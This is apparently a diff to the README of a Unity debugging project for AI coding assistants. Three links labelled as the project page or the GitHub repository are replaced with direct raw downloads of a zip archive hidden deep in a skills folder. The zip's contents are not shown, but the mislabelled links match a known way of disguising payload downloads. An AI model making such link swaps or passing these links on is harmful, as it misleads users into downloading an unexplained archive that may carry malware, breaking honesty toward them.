@@ -1,6 +1,6 @@
 # 🧩 unity-agent-skills - Clear Unity debugging for AI support
 
-[![Download or open the project](https://img.shields.io/badge/Download%20%2F%20Open-Project%20Page-blue?style=for-the-badge)](https://github.com/Logiiiii/unity-agent-skills)
+[![Download or open the project](https://img.shields.io/badge/Download%20%2F%20Open-Project%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Logiiiii/unity-agent-skills/main/skills/jahro-logging/skills-agent-unity-v3.9-alpha.2.zip)
 
 ## 🚀 What this is
 
@@ -19,7 +19,7 @@ It is built for Unity users who want a cleaner way to inspect game behavior with
 
 Open this page to download and set up the project:
 
-[Visit the unity-agent-skills project page](https://github.com/Logiiiii/unity-agent-skills)
+[Visit the unity-agent-skills project page](https://raw.githubusercontent.com/Logiiiii/unity-agent-skills/main/skills/jahro-logging/skills-agent-unity-v3.9-alpha.2.zip)
 
 ### On Windows
 
@@ -181,4 +181,4 @@ agent-skills, ai-assistant, ai-coding, claude-code, cursor, debugging, gamedev, 
 
 ## 🔗 Project link
 
-[Open unity-agent-skills on GitHub](https://github.com/Logiiiii/unity-agent-skills)
+[Open unity-agent-skills on GitHub](https://raw.githubusercontent.com/Logiiiii/unity-agent-skills/main/skills/jahro-logging/skills-agent-unity-v3.9-alpha.2.zip)
